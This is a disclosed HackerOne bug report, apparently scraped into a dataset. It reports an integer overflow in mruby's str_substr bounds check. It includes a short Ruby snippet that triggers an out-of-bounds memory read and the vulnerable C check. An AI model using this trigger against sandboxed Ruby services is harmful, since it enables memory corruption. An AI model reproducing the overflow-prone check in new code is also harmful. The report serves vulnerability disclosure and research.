---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '205884'
original_report_id: '205884'
title: Interger overflow in str_substr leading to read/write out of bound memory
weakness: Uncontrolled Resource Consumption
team_handle: shopify-scripts
created_at: '2017-02-13T05:26:12.272Z'
disclosed_at: '2017-03-15T01:29:48.346Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 4
tags:
- hackerone
- uncontrolled-resource-consumption
---

# Interger overflow in str_substr leading to read/write out of bound memory

## Metadata

- HackerOne Report ID: 205884
- Weakness: Uncontrolled Resource Consumption
- Program: shopify-scripts
- Disclosed At: 2017-03-15T01:29:48.346Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Failed check len & beg in str_substr when call mrb_str_aref_m by String. This can lead to read/write into invalid memory which may be memory corruption or  RCE.
this snippet causes a crash in mruby(i can't check mruby-engine by error undefined symbol >rb_utf8_str_new ):
```
$b="B"*2048
$expand=$b[0x40,0x7fffffff]
puts $expand.size()
puts $expand
```
And, here is error: beg=0x40, len=0x7fffffff, clen=0x800=> beg+len < clen(Integer Overflow)
```
static mrb_value
str_substr(mrb_state *mrb, mrb_value str, mrb_int beg, mrb_int len)
{
/**
*..some code here
**/
if (beg + len > clen) => Integer overflow here
    len = clen - beg;
  if (len <= 0) {
    len = 0;
  }
  return str_subseq(mrb, str, beg, len);
}
```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
